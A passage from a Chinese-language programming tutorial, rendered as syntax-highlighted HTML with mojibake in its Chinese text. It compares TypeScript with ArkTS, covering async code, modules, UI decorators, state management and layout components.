    <span class="hljs-keyword">throw</span> error;
  }
}

<span class="hljs-comment">// ä½¿ç”¨</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> user = <span class="hljs-keyword">await</span> <span class="hljs-title function_">loadUserData</span>(<span class="hljs-number">1</span>);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(user);
}
</code></pre>
<p><strong>ArkTS:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ArkTSæ”¯æŒasync/await</span>
<span class="hljs-keyword">import</span> http <span class="hljs-keyword">from</span> <span class="hljs-string">'@ohos.net.http'</span>;

<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">loadUserData</span>(<span class="hljs-params">userId: <span class="hljs-built_in">number</span></span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">object</span>&gt; {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">let</span> httpRequest = http.<span class="hljs-title function_">createHttp</span>();
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> httpRequest.<span class="hljs-title function_">request</span>(<span class="hljs-string">`https://api.example.com/users/<span class="hljs-subst">${userId}</span>`</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(response.<span class="hljs-property">result</span>.<span class="hljs-title function_">toString</span>());
  } <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'Failed to load user:'</span>, error);
    <span class="hljs-keyword">throw</span> error;
  }
}

<span class="hljs-comment">// ä½¿ç”¨</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> user = <span class="hljs-keyword">await</span> <span class="hljs-title function_">loadUserData</span>(<span class="hljs-number">1</span>);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">info</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(user));
}
</code></pre>
<h3 data-id="heading-32">æ¨¡å—ç³»ç»Ÿ</h3>
<h4 data-id="heading-33">å¯¼å‡º</h4>
<p><strong>TypeScript:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// utils.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a: <span class="hljs-built_in">number</span>, b: <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">number</span> {
  <span class="hljs-keyword">return</span> a + b;
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calculator</span> {
  <span class="hljs-title function_">multiply</span>(<span class="hljs-attr">a</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">b</span>: <span class="hljs-built_in">number</span>): <span class="hljs-built_in">number</span> {
    <span class="hljs-keyword">return</span> a * b;
  }
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MathUtil</span> {
  <span class="hljs-keyword">static</span> <span class="hljs-variable constant_">PI</span> = <span class="hljs-number">3.14159</span>;
}
</code></pre>
<p><strong>ArkTS:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// utils.ets</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a: <span class="hljs-built_in">number</span>, b: <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">number</span> {
  <span class="hljs-keyword">return</span> a + b;
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calculator</span> {
  <span class="hljs-title function_">multiply</span>(<span class="hljs-attr">a</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">b</span>: <span class="hljs-built_in">number</span>): <span class="hljs-built_in">number</span> {
    <span class="hljs-keyword">return</span> a * b;
  }
}

<span class="hljs-comment">// ArkTSä¹Ÿæ”¯æŒé»˜è®¤å¯¼å‡º</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MathUtil</span> {
  <span class="hljs-keyword">static</span> <span class="hljs-variable constant_">PI</span> = <span class="hljs-number">3.14159</span>;
}
</code></pre>
<h4 data-id="heading-34">å¯¼å…¥</h4>
<p><strong>TypeScript:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// å‘½åå¯¼å…¥</span>
<span class="hljs-keyword">import</span> { add, <span class="hljs-title class_">Calculator</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./utils'</span>;

<span class="hljs-comment">// é»˜è®¤å¯¼å…¥</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">MathUtil</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./utils'</span>;

<span class="hljs-comment">// å¯¼å…¥æ‰€æœ‰</span>
<span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> <span class="hljs-title class_">Utils</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./utils'</span>;

<span class="hljs-comment">// é‡å‘½åå¯¼å…¥</span>
<span class="hljs-keyword">import</span> { add <span class="hljs-keyword">as</span> sum } <span class="hljs-keyword">from</span> <span class="hljs-string">'./utils'</span>;
</code></pre>
<p><strong>ArkTS:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ArkTSå¯¼å…¥æ–¹å¼ç›¸åŒ</span>
<span class="hljs-keyword">import</span> { add, <span class="hljs-title class_">Calculator</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./utils'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">MathUtil</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./utils'</span>;
<span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> <span class="hljs-title class_">Utils</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./utils'</span>;
<span class="hljs-keyword">import</span> { add <span class="hljs-keyword">as</span> sum } <span class="hljs-keyword">from</span> <span class="hljs-string">'./utils'</span>;
</code></pre>
<hr/>
<h2 data-id="heading-35">ArkTSç‹¬æœ‰ç‰¹æ€§ï¼ˆTypeScriptæ²¡æœ‰çš„ï¼‰</h2>
<h3 data-id="heading-36">1. å£°æ˜å¼UIè£…é¥°å™¨ç³»ç»Ÿ</h3>
<p>è¿™æ˜¯ArkTSæœ€é‡è¦çš„ç‰¹æ€§ä¹‹ä¸€ï¼ŒTypeScriptå®Œå…¨æ²¡æœ‰è¿™å¥—ä½“ç³»ã€‚</p>
<h4 data-id="heading-37">@Component - è‡ªå®šä¹‰ç»„ä»¶è£…é¥°å™¨</h4>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// TypeScriptä¸­æ²¡æœ‰è¿™ç§ç»„ä»¶è£…é¥°å™¨</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">CustomButton</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">text</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">'Click'</span>;
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Button</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">text</span>)
      .<span class="hljs-title function_">width</span>(<span class="hljs-number">100</span>)
      .<span class="hljs-title function_">height</span>(<span class="hljs-number">40</span>)
  }
}
</code></pre>
<h4 data-id="heading-38">@Entry - é¡µé¢å…¥å£è£…é¥°å™¨</h4>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// æ ‡è®°é¡µé¢å…¥å£ç»„ä»¶ï¼ŒTypeScriptæ²¡æœ‰è¿™ä¸ªæ¦‚å¿µ</span>
<span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">HomePage</span> {
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">'Home Page'</span>)
    }
  }
}
</code></pre>
<h4 data-id="heading-39">@Preview - é¢„è§ˆè£…é¥°å™¨</h4>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ç”¨äºåœ¨DevEco Studioä¸­é¢„è§ˆç»„ä»¶ï¼ŒTypeScriptæ²¡æœ‰</span>
<span class="hljs-meta">@Preview</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">PreviewComponent</span> {
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Text</span>(<span class="hljs-string">'Preview Mode'</span>)
      .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">20</span>)
  }
}
</code></pre>
<h3 data-id="heading-40">2. çŠ¶æ€ç®¡ç†è£…é¥°å™¨</h3>
<p>è¿™æ˜¯ArkTSæœ€æ ¸å¿ƒçš„ç‰¹æ€§ï¼Œç”¨äºå“åº”å¼UIå¼€å‘ï¼ŒTypeScriptå®Œå…¨æ²¡æœ‰ã€‚</p>
<h4 data-id="heading-41">@State - ç»„ä»¶å†…éƒ¨çŠ¶æ€</h4>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">Counter</span> {
  <span class="hljs-comment">// @Stateè£…é¥°å™¨ä½¿å˜é‡å…·æœ‰å“åº”å¼èƒ½åŠ›</span>
  <span class="hljs-comment">// å½“countå˜åŒ–æ—¶ï¼ŒUIä¼šè‡ªåŠ¨æ›´æ–°</span>
  <span class="hljs-meta">@State</span> <span class="hljs-attr">count</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">0</span>;
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">`Count: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.count}</span>`</span>)
      <span class="hljs-title class_">Button</span>(<span class="hljs-string">'Increase'</span>)
        .<span class="hljs-title function_">onClick</span>(<span class="hljs-function">() =&gt;</span> {
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>++; <span class="hljs-comment">// ä¿®æ”¹ä¼šè§¦å‘UIåˆ·æ–°</span>
        })
    }
  }
}
</code></pre>
<p><strong>TypeScriptå¯¹æ¯”ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// TypeScriptéœ€è¦æ‰‹åŠ¨ç®¡ç†çŠ¶æ€æ›´æ–°</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Counter</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">count</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">0</span>;
  
  <span class="hljs-title function_">increase</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>++;
    <span class="hljs-comment">// éœ€è¦æ‰‹åŠ¨è°ƒç”¨æ¸²æŸ“å‡½æ•°</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">render</span>();
  }
  
  <span class="hljs-title function_">render</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// æ‰‹åŠ¨æ›´æ–°DOM</span>
  }
}
</code></pre>
<h4 data-id="heading-42">@Prop - å•å‘æ•°æ®ä¼ é€’</h4>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">ChildComponent</span> {
  <span class="hljs-comment">// @Propä»çˆ¶ç»„ä»¶æ¥æ”¶æ•°æ®ï¼Œå•å‘ä¼ é€’</span>
  <span class="hljs-comment">// å­ç»„ä»¶ä¸èƒ½ä¿®æ”¹@Propè£…é¥°çš„å˜é‡</span>
  <span class="hljs-meta">@Prop</span> <span class="hljs-attr">message</span>: <span class="hljs-built_in">string</span>;
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Text</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">message</span>)
  }
}

<span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">ParentComponent</span> {
  <span class="hljs-meta">@State</span> <span class="hljs-attr">parentMessage</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">'Hello'</span>;
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-title class_">ChildComponent</span>({ <span class="hljs-attr">message</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">parentMessage</span> })
      <span class="hljs-title class_">Button</span>(<span class="hljs-string">'Change'</span>)
        .<span class="hljs-title function_">onClick</span>(<span class="hljs-function">() =&gt;</span> {
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">parentMessage</span> = <span class="hljs-string">'Hi'</span>; <span class="hljs-comment">// å­ç»„ä»¶ä¼šè‡ªåŠ¨æ›´æ–°</span>
        })
    }
  }
}
</code></pre>
<h4 data-id="heading-43">@Link - åŒå‘æ•°æ®ç»‘å®š</h4>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">ChildComponent</span> {
  <span class="hljs-comment">// @Linkå®ç°çˆ¶å­ç»„ä»¶åŒå‘æ•°æ®åŒæ­¥</span>
  <span class="hljs-comment">// å­ç»„ä»¶å¯ä»¥ä¿®æ”¹ï¼Œä¼šåŒæ­¥åˆ°çˆ¶ç»„ä»¶</span>
  <span class="hljs-meta">@Link</span> <span class="hljs-attr">count</span>: <span class="hljs-built_in">number</span>;
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">`Child: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.count}</span>`</span>)
      <span class="hljs-title class_">Button</span>(<span class="hljs-string">'Child +1'</span>)
        .<span class="hljs-title function_">onClick</span>(<span class="hljs-function">() =&gt;</span> {
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>++; <span class="hljs-comment">// ä¿®æ”¹ä¼šåŒæ­¥åˆ°çˆ¶ç»„ä»¶</span>
        })
    }
  }
}

<span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">ParentComponent</span> {
  <span class="hljs-meta">@State</span> <span class="hljs-attr">parentCount</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">0</span>;
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">`Parent: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.parentCount}</span>`</span>)
      <span class="hljs-comment">// ä½¿ç”¨$ç¬¦å·ä¼ é€’å¼•ç”¨</span>
      <span class="hljs-title class_">ChildComponent</span>({ <span class="hljs-attr">count</span>: $parentCount })
    }
  }
}
</code></pre>
<p><strong>TypeScriptå¯¹æ¯”ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// TypeScriptéœ€è¦é€šè¿‡å›è°ƒå‡½æ•°å®ç°åŒå‘ç»‘å®š</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ChildComponent</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">
    <span class="hljs-keyword">private</span> count: <span class="hljs-built_in">number</span>,
    <span class="hljs-keyword">private</span> onChange: (value: <span class="hljs-built_in">number</span>) =&gt; <span class="hljs-built_in">void</span>
  </span>) {}
  
  <span class="hljs-title function_">increment</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>++;
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">onChange</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>); <span class="hljs-comment">// æ‰‹åŠ¨é€šçŸ¥çˆ¶ç»„ä»¶</span>
  }
}
</code></pre>
<h4 data-id="heading-44">@Provide å’Œ @Consume - è·¨å±‚çº§ä¼ é€’</h4>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ç¥–å…ˆç»„ä»¶æä¾›æ•°æ®</span>
<span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">GrandParent</span> {
  <span class="hljs-meta">@Provide</span>(<span class="hljs-string">'theme'</span>) <span class="hljs-attr">theme</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">'dark'</span>;
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-title class_">Parent</span>()
    }
  }
}

<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">Parent</span> {
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-title class_">Child</span>()
    }
  }
}

<span class="hljs-comment">// åä»£ç»„ä»¶æ¶ˆè´¹æ•°æ®ï¼Œæ— éœ€é€å±‚ä¼ é€’</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">Child</span> {
  <span class="hljs-meta">@Consume</span>(<span class="hljs-string">'theme'</span>) <span class="hljs-attr">theme</span>: <span class="hljs-built_in">string</span>;
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Text</span>(<span class="hljs-string">`Theme: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.theme}</span>`</span>)
      .<span class="hljs-title function_">fontColor</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">theme</span> === <span class="hljs-string">'dark'</span> ? <span class="hljs-title class_">Color</span>.<span class="hljs-property">White</span> : <span class="hljs-title class_">Color</span>.<span class="hljs-property">Black</span>)
  }
}
</code></pre>
<p><strong>TypeScriptå¯¹æ¯”ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// TypeScriptéœ€è¦ä½¿ç”¨Contextæˆ–é€å±‚ä¼ é€’props</span>
<span class="hljs-comment">// Reactç¤ºä¾‹</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">ThemeContext</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">createContext</span>(<span class="hljs-string">'light'</span>);

<span class="hljs-keyword">function</span> <span class="hljs-title function_">GrandParent</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ThemeContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"dark"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Parent</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">ThemeContext.Provider</span>&gt;</span></span>
  );
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">Child</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> theme = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">ThemeContext</span>);
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>{theme}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;
}
</code></pre>
<h4 data-id="heading-45">@ObjectLink å’Œ @Observed - åµŒå¥—å¯¹è±¡å“åº”å¼</h4>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// @Observedè£…é¥°ç±»ï¼Œä½¿å…¶å®ä¾‹å…·æœ‰å“åº”å¼èƒ½åŠ›</span>
<span class="hljs-meta">@Observed</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;
  
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span>, age: <span class="hljs-built_in">number</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
  }
}

<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">PersonCard</span> {
  <span class="hljs-comment">// @ObjectLinkç”¨äºåµŒå¥—å¯¹è±¡çš„åŒå‘åŒæ­¥</span>
  <span class="hljs-meta">@ObjectLink</span> <span class="hljs-attr">person</span>: <span class="hljs-title class_">Person</span>;
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">`Name: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.person.name}</span>`</span>)
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">`Age: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.person.age}</span>`</span>)
      <span class="hljs-title class_">Button</span>(<span class="hljs-string">'Birthday'</span>)
        .<span class="hljs-title function_">onClick</span>(<span class="hljs-function">() =&gt;</span> {
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">person</span>.<span class="hljs-property">age</span>++; <span class="hljs-comment">// ä¿®æ”¹ä¼šè§¦å‘UIæ›´æ–°</span>
        })
    }
  }
}

<span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">PersonList</span> {
  <span class="hljs-meta">@State</span> <span class="hljs-attr">people</span>: <span class="hljs-title class_">Person</span>[] = [
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">'Zhang San'</span>, <span class="hljs-number">25</span>),
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">'Li Si'</span>, <span class="hljs-number">30</span>)
  ];
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-title class_">ForEach</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">people</span>, <span class="hljs-function">(<span class="hljs-params">person: Person</span>) =&gt;</span> {
        <span class="hljs-title class_">PersonCard</span>({ <span class="hljs-attr">person</span>: person })
      })
    }
  }
}
</code></pre>
<h4 data-id="heading-46">@Watch - çŠ¶æ€ç›‘å¬</h4>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">WatchExample</span> {
  <span class="hljs-meta">@State</span> <span class="hljs-meta">@Watch</span>(<span class="hljs-string">'onCountChange'</span>) <span class="hljs-attr">count</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">0</span>;
  <span class="hljs-meta">@State</span> <span class="hljs-attr">message</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">''</span>;
  
  <span class="hljs-comment">// ç›‘å¬countå˜åŒ–</span>
  <span class="hljs-title function_">onCountChange</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">message</span> = <span class="hljs-string">`Count changed to <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.count}</span>`</span>;
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">info</span>(<span class="hljs-string">`Count is now: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.count}</span>`</span>);
  }
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-title class_">Text</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">message</span>)
      <span class="hljs-title class_">Button</span>(<span class="hljs-string">'Increase'</span>)
        .<span class="hljs-title function_">onClick</span>(<span class="hljs-function">() =&gt;</span> {
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>++; <span class="hljs-comment">// ä¼šè§¦å‘onCountChange</span>
        })
    }
  }
}
</code></pre>
<h3 data-id="heading-47">3. å£°æ˜å¼UIæ„å»ºè¯­æ³•</h3>
<h4 data-id="heading-48">struct ç»“æ„ä½“ï¼ˆç”¨äºUIç»„ä»¶ï¼‰</h4>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ArkTSä½¿ç”¨structå®šä¹‰UIç»„ä»¶</span>
<span class="hljs-comment">// TypeScriptæ²¡æœ‰è¿™ç§UIç»„ä»¶å®šä¹‰æ–¹å¼</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">MyComponent</span> {
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">'Hello'</span>)
    }
  }
}
</code></pre>
<h4 data-id="heading-49">build() æ–¹æ³•</h4>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// buildæ–¹æ³•æ˜¯ArkTSç»„ä»¶çš„æ ¸å¿ƒ</span>
<span class="hljs-comment">// ç”¨äºå£°æ˜å¼åœ°æè¿°UIç»“æ„</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">UIExample</span> {
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// é“¾å¼è°ƒç”¨è®¾ç½®å±æ€§</span>
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">'Title'</span>)
        .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">20</span>)
        .<span class="hljs-title function_">fontWeight</span>(<span class="hljs-title class_">FontWeight</span>.<span class="hljs-property">Bold</span>)
      
      <span class="hljs-title class_">Button</span>(<span class="hljs-string">'Click'</span>)
        .<span class="hljs-title function_">width</span>(<span class="hljs-number">100</span>)
        .<span class="hljs-title function_">onClick</span>(<span class="hljs-function">() =&gt;</span> {
          <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">info</span>(<span class="hljs-string">'Clicked'</span>);
        })
    }
    .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
    .<span class="hljs-title function_">height</span>(<span class="hljs-string">'100%'</span>)
    .<span class="hljs-title function_">justifyContent</span>(<span class="hljs-title class_">FlexAlign</span>.<span class="hljs-property">Center</span>)
  }
}
</code></pre>
<h3 data-id="heading-50">4. å†…ç½®UIç»„ä»¶</h3>
<p>ArkTSæä¾›äº†å¤§é‡å†…ç½®UIç»„ä»¶ï¼ŒTypeScriptæ²¡æœ‰ã€‚</p>
<h4 data-id="heading-51">å®¹å™¨ç»„ä»¶</h4>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">ContainerExample</span> {
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// Column - å‚ç›´å¸ƒå±€</span>
    <span class="hljs-title class_">Column</span>({ <span class="hljs-attr">space</span>: <span class="hljs-number">10</span> }) {
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">'Item 1'</span>)
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">'Item 2'</span>)
    }
    
    <span class="hljs-comment">// Row - æ°´å¹³å¸ƒå±€</span>
    <span class="hljs-title class_">Row</span>({ <span class="hljs-attr">space</span>: <span class="hljs-number">20</span> }) {
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">'Left'</span>)
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">'Right'</span>)
    }
    
    <span class="hljs-comment">// Stack - å±‚å å¸ƒå±€</span>
    <span class="hljs-title class_">Stack</span>() {
      <span class="hljs-title class_">Image</span>($r(<span class="hljs-string">'app.media.bg'</span>))
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">'Overlay Text'</span>)
    }
    
    <span class="hljs-comment">// Flex - å¼¹æ€§å¸ƒå±€</span>
    <span class="hljs-title class_">Flex</span>({ <span class="hljs-attr">direction</span>: <span class="hljs-title class_">FlexDirection</span>.<span class="hljs-property">Row</span>, <span class="hljs-attr">wrap</span>: <span class="hljs-title class_">FlexWrap</span>.<span class="hljs-property">Wrap</span> }) {
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">'Item 1'</span>).<span class="hljs-title function_">width</span>(<span class="hljs-string">'30%'</span>)
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">'Item 2'</span>).<span class="hljs-title function_">width</span>(<span class="hljs-string">'30%'</span>)
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">'Item 3'</span>).<span class="hljs-title function_">width</span>(<span class="hljs-string">'30%'</span>)
    }
    
    <span class="hljs-comment">// Grid - ç½‘æ ¼å¸ƒå±€</span>
    <span class="hljs-title class_">Grid</span>() {
      <span class="hljs-title class_">GridItem</span>() { <span class="hljs-title class_">Text</span>(<span class="hljs-string">'1'</span>) }
